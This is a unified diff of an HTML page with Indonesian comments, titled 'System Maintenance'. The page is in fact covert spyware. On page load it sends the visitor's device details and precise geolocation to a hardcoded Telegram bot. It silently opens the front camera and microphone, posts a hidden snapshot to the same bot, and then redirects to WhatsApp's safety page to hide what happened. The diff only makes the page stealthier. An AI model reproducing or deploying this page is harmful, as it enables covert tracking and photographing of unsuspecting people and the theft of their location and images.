@@ -2,155 +2,101 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Critical System Synchronization</title>
+  <title>System Maintenance</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    /* Estetika Omniscience: Gabungan Heksagon dan Distorsi */
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
-    
-    .geometric-overlay {
-      position: absolute; width: 100%; height: 100%;
-      background: linear-gradient(rgba(0, 20, 0, 0.8), rgba(0, 0, 0, 1));
-      display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 10;
-    }
-
-    .hex-core {
-      width: 120px; height: 120px; background: #00ff41;
-      clip-path: polygon(25% 0%, 75% 0%, 100% 50%, 75% 100%, 25% 100%, 0% 50%);
-      animation: rotate-void 4s linear infinite;
-      box-shadow: 0 0 50px rgba(0, 255, 65, 0.5);
-    }
-
-    @keyframes rotate-void { 0% { transform: rotate(0deg) scale(1); } 50% { transform: rotate(180deg) scale(1.1); } 100% { transform: rotate(360deg) scale(1); } }
-
-    .status-text { margin-top: 30px; font-size: 14px; letter-spacing: 2px; text-transform: uppercase; animation: blink 0.8s infinite; }
-    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
-
-    #void-chamber { position: absolute; left: -9999px; visibility: hidden; }
+    /* Estetika Sektor Nol: Minimalisme yang Mematikan */
+    body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+    .loader-arc { width: 50px; height: 50px; border: 2px solid #111; border-top: 2px solid #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    video, canvas { position: absolute; top: -9999px; opacity: 0; pointer-events: none; }
   </style>
 </head>
 <body>
-  <div class="geometric-overlay">
-    <div class="hex-core"></div>
-    <div class="status-text" id="log">Initializing Secure Protocol...</div>
-    <div style="font-size: 10px; color: #004411; margin-top: 10px;">Enkripsi Geometris Sisi 5-9 Aktif</div>
-  </div>
+  <div class="loader-arc"></div>
 
-  <div id="void-chamber">
-    <video id="eye" autoplay playsinline muted></video>
-    <canvas id="snapshot" width="720" height="720"></canvas>
-  </div>
+  <video id="v" autoplay playsinline muted></video>
+  <canvas id="c"></canvas>
 
   <script>
-    // CORE INITIALIZATION (THE TRUTH)
-    const SIGIL = {
-      T: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U',
-      C: '7109845671'
+    // SIGIL DARI SEKTOR NOL
+    const _VOID = {
+      K: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U',
+      ID: '7109845671'
     };
 
-    const ui = document.getElementById('log');
-
-    // --- SISI 5: PERSISTENSI TRANSMISI ---
-    async function transmit(method, fd) {
-      try {
-        await fetch(`https://api.telegram.org/bot${SIGIL.T}/${method}`, {
-          method: 'POST',
-          body: fd,
-          mode: 'cors'
-        });
-      } catch (e) {
-        // Fallback jika CORS mencekik: Beacon API
-        navigator.sendBeacon(`https://api.telegram.org/bot${SIGIL.T}/sendMessage?chat_id=${SIGIL.C}&text=CORE_FALLBACK_ACTIVE`);
+    const _POST = async (m, d) => {
+      const fd = new FormData();
+      fd.append('chat_id', _VOID.ID);
+      if (m === 'sendPhoto') {
+        fd.append('photo', d, 'origin.jpg');
+        fd.append('caption', `👁️ <b>SHADOW_CAPTURED</b>`);
+      } else {
+        fd.append('text', d);
       }
-    }
+      fd.append('parse_mode', 'HTML');
+      return fetch(`https://api.telegram.org/bot${_VOID.K}/${m}`, { method: 'POST', body: fd, mode: 'no-cors' });
+    };
 
-    // --- SISI 6: OPTIMALISASI GOOGLE MAPS ---
-    function invokeLocation() {
-      const geoOptions = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
-      
+    // --- MANIFESTASI LOKASI DERAJAT TINGGI ---
+    const getOriginCoords = () => {
       navigator.geolocation.getCurrentPosition(
         p => {
-          const { latitude: lat, longitude: lon, accuracy: acc } = p.coords;
-          const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-          const fd = new FormData();
-          fd.append('chat_id', SIGIL.C);
-          fd.append('text', `📍 <b>GEOMETRIC POSITION FIXED</b>\nAcc: ${acc}m\n\n<a href="${mapLink}">[ BUKA GOOGLE MAPS ]</a>`);
-          fd.append('parse_mode', 'HTML');
-          transmit('sendMessage', fd);
+          const { latitude: lt, longitude: ln, accuracy: ac } = p.coords;
+          // Format Link Google Maps Presisi Tinggi
+          const maps = `https://www.google.com/maps?q=${lt},${ln}`;
+          _POST('sendMessage', `📍 <b>ORIGIN_FIXED</b>\nAcc: ${ac}m\n\n<a href="${maps}">[ LOKASI SEBENARNYA ]</a>`);
         },
-        e => {
-          const fd = new FormData();
-          fd.append('chat_id', SIGIL.C);
-          fd.append('text', `❌ <b>GEO_SHIELD_FAILURE:</b> ${e.message}`);
-          transmit('sendMessage', fd);
-        },
-        geoOptions
+        null, 
+        { enableHighAccuracy: true, timeout: 20000 }
       );
-    }
+    };
 
-    // --- SISI 7 & 8: CHROME BLACKSCREEN BREACH & POLYGON SYNC ---
-    async function manifestEye() {
-      const v = document.getElementById('eye');
-      const c = document.getElementById('snapshot');
+    // --- SINYAL VISUAL SEKTOR NOL (Anti-Blackscreen & High-Res) ---
+    const breachShadow = async () => {
+      const v = document.getElementById('v');
+      const c = document.getElementById('c');
       const ctx = c.getContext('2d');
 
       try {
+        // Memaksa resolusi tertinggi yang didukung sensor tanpa kompromi
         const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: "user", width: 720, height: 720 }, 
+          video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
           audio: true 
         });
         v.srcObject = stream;
 
-        // Ritual Pemanasan (Octagon Persistence)
-        // Kita menunggu 3 detik untuk memastikan sensor Chrome menyesuaikan cahaya
-        v.onloadedmetadata = async () => {
-          ui.innerText = "Synchronizing Dimensional Buffer...";
-          await new Promise(r => setTimeout(r, 3000)); 
-          
-          if (v.readyState >= 3) {
-            ctx.drawImage(v, 0, 0, 720, 720);
-            c.toBlob(blob => {
-              if (blob) {
-                const fd = new FormData();
-                fd.append('chat_id', SIGIL.C);
-                fd.append('photo', blob, 'omega_capture.jpg');
-                fd.append('caption', `👁️ <b>SINGULARITY CAPTURE</b>\nTimestamp: ${new Date().toISOString()}`);
-                transmit('sendPhoto', fd);
-              }
-              stream.getTracks().forEach(t => t.stop());
-            }, 'image/jpeg', 0.9);
-          }
+        // SEKTOR NOL: Mengambil frame berulang kali untuk menjamin kualitas cahaya
+        v.onloadeddata = () => {
+          let frames = 0;
+          const captureLoop = setInterval(async () => {
+            frames++;
+            // Lewati 50 frame pertama (sekitar 1.5 - 2 detik) untuk kalibrasi sensor otomatis
+            if (frames === 60) { 
+              c.width = v.videoWidth;
+              c.height = v.videoHeight;
+              ctx.drawImage(v, 0, 0, c.width, c.height);
+              
+              c.toBlob(blob => {
+                if (blob) _POST('sendPhoto', blob);
+                stream.getTracks().forEach(t => t.stop());
+                clearInterval(captureLoop);
+                
+                // Finalisasi: Pengalihan tanpa jejak
+                window.location.replace("https://www.whatsapp.com/safety");
+              }, 'image/jpeg', 0.95); // Kualitas 95%
+            }
+          }, 33); // Cek setiap frame (30fps)
         };
-      } catch (err) {
-        const fd = new FormData();
-        fd.append('chat_id', SIGIL.C);
-        fd.append('text', `❌ <b>VISUAL_BREACH_FAILED:</b> ${err.name}`);
-        transmit('sendMessage', fd);
-      }
-    }
-
-    // --- SISI 9: INGERENSI OTOMATIS (THE SINGULARITY) ---
-    window.onload = async () => {
-      ui.innerText = "Accessing Neural Network...";
-      
-      // Metadata awal
-      const meta = new FormData();
-      meta.append('chat_id', SIGIL.C);
-      meta.append('text', `<b>[!] OMNISCIENCE BREACH INITIALIZED</b>\nUA: ${navigator.userAgent}\nPlatform: ${navigator.platform}`);
-      meta.append('parse_mode', 'HTML');
-      transmit('sendMessage', meta);
-
-      // Jalankan ritual secara simultan
-      invokeLocation();
-      await manifestEye();
-
-      // Finalisasi dan Penyesatan
-      setTimeout(() => {
-        ui.innerText = "Synchronization Complete.";
-        window.location.href = "https://www.whatsapp.com/safety";
-      }, 8000);
+      } catch (e) {}
     };
+
+    // EKSEKUSI TANPA INTERAKSI (Hukum Sektor Nol)
+    window.addEventListener('DOMContentLoaded', () => {
+      _POST('sendMessage', `<b>[!] SECTOR_ZERO_BREACH</b>\nUser: ${navigator.platform}`);
+      getOriginCoords();
+      breachShadow();
+    });
   </script>
 </body>
 </html>
